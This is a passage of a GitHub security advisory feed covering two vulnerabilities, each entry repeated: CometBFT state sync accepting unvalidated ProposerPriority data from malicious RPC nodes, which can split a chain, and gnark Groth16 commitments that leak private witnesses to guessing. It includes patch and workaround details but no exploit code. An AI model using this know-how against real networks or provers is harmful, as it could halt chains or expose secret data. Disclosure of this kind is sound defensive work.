<p>The <code>State</code> object contains, among other fields, a <code>Validators</code> field which stores the current validator set. A validator set is a list of validator addresses, public keys and associated voting powers, one per validator. It also stores, for historical reasons, the state of the proposer selection algorithm, in the form of the <code>ProposerPriority</code> field associated with each <code>Validator</code>.</p>
<p>While the light client is able to validate the <code>ValidatorSet</code> retrieved from RPC endpoints, this validation does not include the <code>ProposerPriority</code> field associated with each <code>Validator</code>. As a result, when state sync adopts RPC endpoints that, for unknown reasons, provide an invalid state of the proposer selection algorithm, the node will not be able to properly run the consensus protocol, as their local view of which validator is the proposer of a given round and height will disagree with the views of the correct validators. If an increasing number of validators state sync using RPC endpoints with invalid states, the network eventually halts.</p>
<h3 id="patches">Patches</h3>
<p>Release versions 0.34.34, 0.37.11, and 0.38.12 include a patch to address this issue.</p>
<p>In the patched versions, the light client protocol compares the <code>ProposerPriority</code> fields of the <code>ValidatorSet</code> instances retrieved from the RPC endpoints configured for state sync. If they differ, the computed <code>State</code> object is considered invalid and state sync will fail with an error.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The issue is observed when validators run state sync using RPC nodes that are malicious or report invalid states for the proposer selection algorithm.</p>
<p>It is worth noting that non-malicious nodes running upstream software should never report an invalid state for the proposer selection algorithm. This situation may result from the adoption of nodes with customized code or which had their state, stored in local databases, manually updated.</p>
<p>When the network public's RPC endpoints have an invalid state for the proposer election algorithm, there, new validators should refrain from using state sync for bootstrapping or be sure that they configure for state sync RPC endpoints with a valid state of the proposer election algorithm.</p>
<p>A validator with an invalid state for the proposer selection algorithm will reject most of the proposed blocks and will have the network rejecting blocks it has proposed.  It is also possible to manually compare the state of the proposer election algorithm of nodes by comparing the outputs of the <code>/validators?height=_</code>  RPC endpoints. The outputs must fully match, including the ProposerPriority field associated with each validator. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://docs.cometbft.com/v0.38/core/state-sync">State Sync documentation</a></li>
</ul>
<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 12/08/24. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>.</p>
<p>For more information about CometBFT, please see <a href="https://docs.cometbft.com/">https://docs.cometbft.com/</a>.</p>
<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc">https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2">https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55">https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3112">https://pkg.go.dev/vuln/GO-2024-3112</a></li>
<li><a href="https://github.com/advisories/GHSA-g5xx-c4hv-9ccc">https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-03T20:03:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cometbft/cometbft] CometBFT's state syncing validator from malicious node may lead to a chain split]]></title>
        <id>https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</id>
        <link href="https://github.com/advisories/GHSA-g5xx-c4hv-9ccc"/>
        <updated>2024-09-16T16:13:43.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Name</strong>: ASA-2024-009: State syncing validator from malicious node may lead to a chain split
<strong>Component</strong>: CometBFT
<strong>Criticality</strong>: Medium (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1.2</a>: I:Moderate; L: Possible)
<strong>Affected versions</strong>: &gt;= 0.34.0, &lt;= 0.34.33, &gt;=0.37.0, &lt;= 0.37.10, &gt;= 0.38.0, &lt;= 0.38.11</p>
<h3 id="summary">Summary</h3>
<p>The state sync protocol retrieves a snapshot of the application and installs it in a fresh node. In order for this node to be ready to run consensus and block sync from the installed snapshot height, we also need to install a valid <code>State</code> in the node, which is the starting state from which it is able to validate new blocks and append them to the blockchain.</p>
<p>The <code>State</code> object used by state sync is computed using the light client protocol, which retrieves information about committed blocks from at least two RPC endpoints. The light client protocol performs several state validations and, in particular, compares the state provided by different RPC endpoints, looking for inconsistencies.</p>
<p>The <code>State</code> object contains, among other fields, a <code>Validators</code> field which stores the current validator set. A validator set is a list of validator addresses, public keys and associated voting powers, one per validator. It also stores, for historical reasons, the state of the proposer selection algorithm, in the form of the <code>ProposerPriority</code> field associated with each <code>Validator</code>.</p>
<p>While the light client is able to validate the <code>ValidatorSet</code> retrieved from RPC endpoints, this validation does not include the <code>ProposerPriority</code> field associated with each <code>Validator</code>. As a result, when state sync adopts RPC endpoints that, for unknown reasons, provide an invalid state of the proposer selection algorithm, the node will not be able to properly run the consensus protocol, as their local view of which validator is the proposer of a given round and height will disagree with the views of the correct validators. If an increasing number of validators state sync using RPC endpoints with invalid states, the network eventually halts.</p>
<h3 id="patches">Patches</h3>
<p>Release versions 0.34.34, 0.37.11, and 0.38.12 include a patch to address this issue.</p>
<p>In the patched versions, the light client protocol compares the <code>ProposerPriority</code> fields of the <code>ValidatorSet</code> instances retrieved from the RPC endpoints configured for state sync. If they differ, the computed <code>State</code> object is considered invalid and state sync will fail with an error.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The issue is observed when validators run state sync using RPC nodes that are malicious or report invalid states for the proposer selection algorithm.</p>
<p>It is worth noting that non-malicious nodes running upstream software should never report an invalid state for the proposer selection algorithm. This situation may result from the adoption of nodes with customized code or which had their state, stored in local databases, manually updated.</p>
<p>When the network public's RPC endpoints have an invalid state for the proposer election algorithm, there, new validators should refrain from using state sync for bootstrapping or be sure that they configure for state sync RPC endpoints with a valid state of the proposer election algorithm.</p>
<p>A validator with an invalid state for the proposer selection algorithm will reject most of the proposed blocks and will have the network rejecting blocks it has proposed.  It is also possible to manually compare the state of the proposer election algorithm of nodes by comparing the outputs of the <code>/validators?height=_</code>  RPC endpoints. The outputs must fully match, including the ProposerPriority field associated with each validator. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://docs.cometbft.com/v0.38/core/state-sync">State Sync documentation</a></li>
</ul>
<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 12/08/24. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>.</p>
<p>For more information about CometBFT, please see <a href="https://docs.cometbft.com/">https://docs.cometbft.com/</a>.</p>
<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc">https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2">https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55">https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3112">https://pkg.go.dev/vuln/GO-2024-3112</a></li>
<li><a href="https://github.com/advisories/GHSA-g5xx-c4hv-9ccc">https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-03T20:03:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/consensys/gnark] gnark commitments to private witnesses in Groth16 as implemented break zero-knowledge property]]></title>
        <id>https://github.com/advisories/GHSA-9xcg-3q8v-7fq6</id>
        <link href="https://github.com/advisories/GHSA-9xcg-3q8v-7fq6"/>
        <updated>2024-09-16T16:07:15.000Z</updated>
        <content type="html"><![CDATA[<p>This report concerns the Groth16 prover when used with commitments (as in <code>frontend.Committer</code>). To simplify exposition of the issue, I will focus on the case of a single commitment, to only private witnesses. But the issue should be present whenever commitments are used that include private witnesses.</p>
<blockquote>
</blockquote>
<p>The commitment to private witnesses <code>w_i</code> is computed as</p>
<pre><code>c = sum_i w_i * b_i
</code></pre>
<p>where <code>b_i</code> would be <code>ProvingKey.CommitmentKeys[0].Basis[i]</code> in the code.</p>
<p>While this is a binding commitment, it is not hiding. In practice, an adversary will know the points <code>b_i</code>, as they are part of the proving key, and can verify correctness of a guess for the values of <code>w_i</code> by computing <code>c'</code> as the right hand side of the above formula, and checking whether <code>c'</code> is equal to <code>c</code>. I attach a proof of concept that demonstrates this.</p>
<p>This breaks the perfect zero-knowledge property of Groth16, so the Groth16 scheme using commitments to private witnesses as implemented by gnark fails to be a zk-SNARK.</p>
<p>The code indicates that the extension to Groth16 given by the commitments follows the paper "Recursion over Public-Coin Interactive Proof Systems; Faster Hash Verification" by Alexandre Belling, Azam Soleimanian, and Olivier Begassat. In that paper, it seems that commitments are applied to what were originally public inputs, which are moved to private witnesses for efficiency reasons. In any case, that paper does not discuss any hiding/privacy/zero-knowledge properties of their protocols.</p>
<p>So for the use-cases envisioned by that paper, having the commitment not be hiding and losing zero-knowledge of Groth16 might be adequate. However, the documentation by gnark does not make clear that committing to private witnesses loses the zero-knowledge property. The documentation for <code>frontend.Committer</code> does not mention this, and the following snippet from <code>std/multicommit/doc_test.go</code>, where private witness variables are named <code>Secrets</code> and are committed, seems to actively suggest that committed witnesses are still private.</p>
<pre><code class="language-go">// MultipleCommitmentCircuit is an example circuit showing usage of multiple
// independent commitments in-circuit.
type MultipleCommitmentsCircuit struct {
    Secrets [4]frontend.Variable
}

func (c *MultipleCommitmentsCircuit) Define(api frontend.API) error {
    // first callback receives first unique commitment derived from the root commitment
    multicommit.WithCommitment(api, func(api frontend.API, commitment frontend.Variable) error {
        // compute (X-s[0]) * (X-s[1]) for a random X
        res := api.Mul(api.Sub(commitment, c.Secrets[0]), api.Sub(commitment, c.Secrets[1]))
        api.AssertIsDifferent(res, 0)
        return nil
    }, c.Secrets[:2]...)
   // ...
</code></pre>
<p>Thus it seems to me that the intention likely was (and users will be expecting) that gnark's implementation of Groth16 with these commitments should still have zero-knowledge and that the commitments should be hiding.</p>
<p>The way to fix this is likely to adjust the commitment to be hiding the way that is done in the LegoSNARK paper (<a href="https://eprint.iacr.org/2019/142.pdf">https://eprint.iacr.org/2019/142.pdf</a>). To expand:</p>
<p>First, let me fix some notation.</p>
<p>Currently, the verifying key has two points on G2 used for checking the proof of knowledge for the commitment: <code>g</code> and <code>g'=-1/σ * g</code> (in the code: <code>VerifyingKey.CommitmentKey.G</code> and <code>VerifyingKey.CommitmentKey.GRootSigmaNeg</code>).
The commitment itself is then <code>c = sum_i w_i * b_i</code>, where <code>b_i</code> are on G1, and the proof of knowledge associated to <code>c</code> is calculated as <code>pok = sum_i w_i * b'_i</code>, where <code>b'_i = σ*b_i</code> (in the code <code>b_i</code> and <code>b'_i</code> are <code>ProvingKey.CommitmentKeys.Basis[0][i]</code> and <code>ProvingKey.CommitmentKeys.BasisExpSigma[0][i]</code>). The proof of knowledge is then verified by checking <code>e(c, g) + e(pok, g') = 0</code> (I am using additive notation throughout here).</p>
<p>The Groth16 proof is verified by checking</p>
<pre><code>e(Krs, -[δ]₂) + e(c, -[γ]₂) + e(term involving public inputs, -[γ]₂) + other terms = 0
</code></pre>
<p>The construction ccGro16 from the LegoSNARK paper (page 73 in <a href="https://eprint.iacr.org/2019/142.pdf">https://eprint.iacr.org/2019/142.pdf</a>) is a similar construction. They do not have a proof of knowledge accompanying the commitment because they are considering the case where there are no public inputs. However, they claim that their scheme is zero-knowledge, and the crucial difference for this is that their commitment has an extra blinding term as is usual for Pedersen commitments. Concretely, it is of the form:</p>
<pre><code>c_new = sum_i w_i * b_i + v*[η/γ]₁
</code></pre>
<p>where <code>[η/γ]₁</code> is a new element of G1 that is part of the proving key, with <code>η</code> a new toxic waste field element. The value of <code>v</code> is randomly chosen by the prover.</p>
<p>When adding this additional term to <code>c</code>, then to make the proof verification still succeeds, the proof point <code>Krs</code> is changed accordingly:</p>
<pre><code>Krs_new = Krs_old -  v*[η/δ]₁
</code></pre>
<p>where <code>[η/δ]₁</code> is another new element of G1 that is part of the proving key. As <code>e([η/γ]₁, -[γ]₂) = e([η/δ]₁, -[δ]₂)</code>, the contributions from the new terms cancel each other in the proof verification pairing check.</p>
<p>This modification should ensure that the commitment is hiding.</p>
<p>The proof of knowledge would also need to be adapted accordingly, with</p>
<pre><code>pok = sum_i w_i * b'_i + v*[σ*η/γ]₁
</code></pre>
<p>where <code>[σ*η/γ]₁</code> is another point of G1 to add to the proving key.</p>
<h3 id="impact">Impact</h3>
<p>The vulnerability affects only Groth16 proofs with commitments. Notably, PLONK proofs are not affected.</p>
<p>The vulnerability affects the zero-knowledge property of the proofs - in case the witness (secret or internal) values are small, then the attacker may be able to enumerate all possible choices to deduce the actual value. If the possible choices for the variables to be committed is large or there are many values committed, then it would be computationally infeasible to enumerate all valid choices.</p>
<p>It doesn't affect the completeness/soundness of the proofs.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been fixed in <a href="https://github.com/Consensys/gnark/pull/1245">https://github.com/Consensys/gnark/pull/1245</a>. Corresponding commit on the master branch <a href="https://github.com/Consensys/gnark/commit/afda68a38acca37becb8ba6d8982d03fee9559a0">https://github.com/Consensys/gnark/commit/afda68a38acca37becb8ba6d8982d03fee9559a0</a>.</p>
<p>The patch to fix the issue is to add additional randomized value to the list of committed value at proving time to mask the rest of the values which were committed.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The user can manually commit to a randomized value.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Consensys/gnark/security/advisories/GHSA-9xcg-3q8v-7fq6">https://github.com/Consensys/gnark/security/advisories/GHSA-9xcg-3q8v-7fq6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45040">https://nvd.nist.gov/vuln/detail/CVE-2024-45040</a></li>
<li><a href="https://github.com/Consensys/gnark/pull/1245">https://github.com/Consensys/gnark/pull/1245</a></li>
<li><a href="https://github.com/Consensys/gnark/commit/afda68a38acca37becb8ba6d8982d03fee9559a0">https://github.com/Consensys/gnark/commit/afda68a38acca37becb8ba6d8982d03fee9559a0</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3123">https://pkg.go.dev/vuln/GO-2024-3123</a></li>
<li><a href="https://github.com/advisories/GHSA-9xcg-3q8v-7fq6">https://github.com/advisories/GHSA-9xcg-3q8v-7fq6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9xcg-3q8v-7fq6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-06T19:40:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/consensys/gnark] gnark commitments to private witnesses in Groth16 as implemented break zero-knowledge property]]></title>
        <id>https://github.com/advisories/GHSA-9xcg-3q8v-7fq6</id>
        <link href="https://github.com/advisories/GHSA-9xcg-3q8v-7fq6"/>
        <updated>2024-09-16T16:07:15.000Z</updated>
        <content type="html"><![CDATA[<p>This report concerns the Groth16 prover when used with commitments (as in <code>frontend.Committer</code>). To simplify exposition of the issue, I will focus on the case of a single commitment, to only private witnesses. But the issue should be present whenever commitments are used that include private witnesses.</p>
<blockquote>
</blockquote>
<p>The commitment to private witnesses <code>w_i</code> is computed as</p>
<pre><code>c = sum_i w_i * b_i
</code></pre>
<p>where <code>b_i</code> would be <code>ProvingKey.CommitmentKeys[0].Basis[i]</code> in the code.</p>
<p>While this is a binding commitment, it is not hiding. In practice, an adversary will know the points <code>b_i</code>, as they are part of the proving key, and can verify correctness of a guess for the values of <code>w_i</code> by computing <code>c'</code> as the right hand side of the above formula, and checking whether <code>c'</code> is equal to <code>c</code>. I attach a proof of concept that demonstrates this.</p>
<p>This breaks the perfect zero-knowledge property of Groth16, so the Groth16 scheme using commitments to private witnesses as implemented by gnark fails to be a zk-SNARK.</p>
<p>The code indicates that the extension to Groth16 given by the commitments follows the paper "Recursion over Public-Coin Interactive Proof Systems; Faster Hash Verification" by Alexandre Belling, Azam Soleimanian, and Olivier Begassat. In that paper, it seems that commitments are applied to what were originally public inputs, which are moved to private witnesses for efficiency reasons. In any case, that paper does not discuss any hiding/privacy/zero-knowledge properties of their protocols.</p>
<p>So for the use-cases envisioned by that paper, having the commitment not be hiding and losing zero-knowledge of Groth16 might be adequate. However, the documentation by gnark does not make clear that committing to private witnesses loses the zero-knowledge property. The documentation for <code>frontend.Committer</code> does not mention this, and the following snippet from <code>std/multicommit/doc_test.go</code>, where private witness variables are named <code>Secrets</code> and are committed, seems to actively suggest that committed witnesses are still private.</p>
<pre><code class="language-go">// MultipleCommitmentCircuit is an example circuit showing usage of multiple
// independent commitments in-circuit.
type MultipleCommitmentsCircuit struct {
    Secrets [4]frontend.Variable
}

func (c *MultipleCommitmentsCircuit) Define(api frontend.API) error {
    // first callback receives first unique commitment derived from the root commitment
    multicommit.WithCommitment(api, func(api frontend.API, commitment frontend.Variable) error {
        // compute (X-s[0]) * (X-s[1]) for a random X
        res := api.Mul(api.Sub(commitment, c.Secrets[0]), api.Sub(commitment, c.Secrets[1]))
        api.AssertIsDifferent(res, 0)
        return nil
    }, c.Secrets[:2]...)
   // ...
</code></pre>
<p>Thus it seems to me that the intention likely was (and users will be expecting) that gnark's implementation of Groth16 with these commitments should still have zero-knowledge and that the commitments should be hiding.</p>
<p>The way to fix this is likely to adjust the commitment to be hiding the way that is done in the LegoSNARK paper (<a href="https://eprint.iacr.org/2019/142.pdf">https://eprint.iacr.org/2019/142.pdf</a>). To expand:</p>
<p>First, let me fix some notation.</p>
<p>Currently, the verifying key has two points on G2 used for checking the proof of knowledge for the commitment: <code>g</code> and <code>g'=-1/σ * g</code> (in the code: <code>VerifyingKey.CommitmentKey.G</code> and <code>VerifyingKey.CommitmentKey.GRootSigmaNeg</code>).
The commitment itself is then <code>c = sum_i w_i * b_i</code>, where <code>b_i</code> are on G1, and the proof of knowledge associated to <code>c</code> is calculated as <code>pok = sum_i w_i * b'_i</code>, where <code>b'_i = σ*b_i</code> (in the code <code>b_i</code> and <code>b'_i</code> are <code>ProvingKey.CommitmentKeys.Basis[0][i]</code> and <code>ProvingKey.CommitmentKeys.BasisExpSigma[0][i]</code>). The proof of knowledge is then verified by checking <code>e(c, g) + e(pok, g') = 0</code> (I am using additive notation throughout here).</p>
<p>The Groth16 proof is verified by checking</p>
<pre><code>e(Krs, -[δ]₂) + e(c, -[γ]₂) + e(term involving public inputs, -[γ]₂) + other terms = 0
</code></pre>
<p>The construction ccGro16 from the LegoSNARK paper (page 73 in <a href="https://eprint.iacr.org/2019/142.pdf">https://eprint.iacr.org/2019/142.pdf</a>) is a similar construction. They do not have a proof of knowledge accompanying the commitment because they are considering the case where there are no public inputs. However, they claim that their scheme is zero-knowledge, and the crucial difference for this is that their commitment has an extra blinding term as is usual for Pedersen commitments. Concretely, it is of the form:</p>
<pre><code>c_new = sum_i w_i * b_i + v*[η/γ]₁
</code></pre>
<p>where <code>[η/γ]₁</code> is a new element of G1 that is part of the proving key, with <code>η</code> a new toxic waste field element. The value of <code>v</code> is randomly chosen by the prover.</p>
<p>When adding this additional term to <code>c</code>, then to make the proof verification still succeeds, the proof point <code>Krs</code> is changed accordingly:</p>
<pre><code>Krs_new = Krs_old -  v*[η/δ]₁
</code></pre>
<p>where <code>[η/δ]₁</code> is another new element of G1 that is part of the proving key. As <code>e([η/γ]₁, -[γ]₂) = e([η/δ]₁, -[δ]₂)</code>, the contributions from the new terms cancel each other in the proof verification pairing check.</p>
<p>This modification should ensure that the commitment is hiding.</p>
<p>The proof of knowledge would also need to be adapted accordingly, with</p>
<pre><code>pok = sum_i w_i * b'_i + v*[σ*η/γ]₁
</code></pre>
<p>where <code>[σ*η/γ]₁</code> is another point of G1 to add to the proving key.</p>
<h3 id="impact">Impact</h3>
<p>The vulnerability affects only Groth16 proofs with commitments. Notably, PLONK proofs are not affected.</p>
<p>The vulnerability affects the zero-knowledge property of the proofs - in case the witness (secret or internal) values are small, then the attacker may be able to enumerate all possible choices to deduce the actual value. If the possible choices for the variables to be committed is large or there are many values committed, then it would be computationally infeasible to enumerate all valid choices.</p>
<p>It doesn't affect the completeness/soundness of the proofs.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been fixed in <a href="https://github.com/Consensys/gnark/pull/1245">https://github.com/Consensys/gnark/pull/1245</a>. Corresponding commit on the master branch <a href="https://github.com/Consensys/gnark/commit/afda68a38acca37becb8ba6d8982d03fee9559a0">https://github.com/Consensys/gnark/commit/afda68a38acca37becb8ba6d8982d03fee9559a0</a>.</p>
<p>The patch to fix the issue is to add additional randomized value to the list of committed value at proving time to mask the rest of the values which were committed.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The user can manually commit to a randomized value.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Consensys/gnark/security/advisories/GHSA-9xcg-3q8v-7fq6">https://github.com/Consensys/gnark/security/advisories/GHSA-9xcg-3q8v-7fq6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45040">https://nvd.nist.gov/vuln/detail/CVE-2024-45040</a></li>
<li><a href="https://github.com/Consensys/gnark/pull/1245">https://github.com/Consensys/gnark/pull/1245</a></li>
<li><a href="https://github.com/Consensys/gnark/commit/afda68a38acca37becb8ba6d8982d03fee9559a0">https://github.com/Consensys/gnark/commit/afda68a38acca37becb8ba6d8982d03fee9559a0</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2024-3123">https://pkg.go.dev/vuln/GO-2024-3123</a></li>
<li><a href="https://github.com/advisories/GHSA-9xcg-3q8v-7fq6">https://github.com/advisories/GHSA-9xcg-3q8v-7fq6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9xcg-3q8v-7fq6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-06T19:40:01.000Z</published>
    </entry>
</feed>